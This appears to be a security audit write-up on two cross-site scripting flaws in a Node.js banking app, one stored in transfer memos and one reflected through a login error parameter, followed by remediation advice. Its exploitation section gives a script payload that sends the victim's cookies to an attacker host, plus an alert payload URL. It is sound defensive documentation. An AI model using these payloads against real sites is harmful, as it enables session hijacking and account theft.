# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious client-side scripts into web pages viewed by other users, leading to session hijacking, defacement, or unauthorized actions performed on behalf of authenticated victims.

## 1. Stored XSS in Transaction Ledgers
- **Files**: `routes/transfers.js` and `views/account-details.ejs`
- **Mechanism**: When funds are wired, the custom transaction description is saved directly to the database without stripping HTML tags or script payloads. When viewing the ledger history, the EJS view template utilizes the raw output interpolation tag `<%- ... %>`:
  ```html
  <td style="background-color: #fffcf5;"><%- tx.description %></td>
  ```
- **Exploitation**: An attacker can transfer a nominal amount to a target victim's account and input a memo payload such as `<script>fetch('http://attacker.com/log?cookie=' + document.cookie)</script>`. As soon as the victim navigates to their account details page to check recent deposits, the script executes within their highly trusted banking session.

## 2. Reflected XSS in System Authentication Alerts
- **Files**: `routes/auth.js` and `views/login.ejs`
- **Mechanism**: Backend errors encountered during database authentication operations are passed directly to redirect URLs via query strings:
  ```javascript
  return res.redirect('/login?error=' + encodeURIComponent(err.message));
  ```
  The login view subsequently renders this error content directly into an alert tag using raw output formatting `<%- error %>`.
- **Exploitation**: Attackers can craft links targeting `/login?error=<script>alert(1)</script>` and distribute them to targets to execute scripts immediately upon page access.

## Remediation Strategy
Always enforce contextual output encoding before rendering untrusted or user-supplied input into web documents. Use secure template tags (e.g., EJS `<%= ... %>` which applies standard HTML entity escaping) to ensure input strings are rendered strictly as display text.
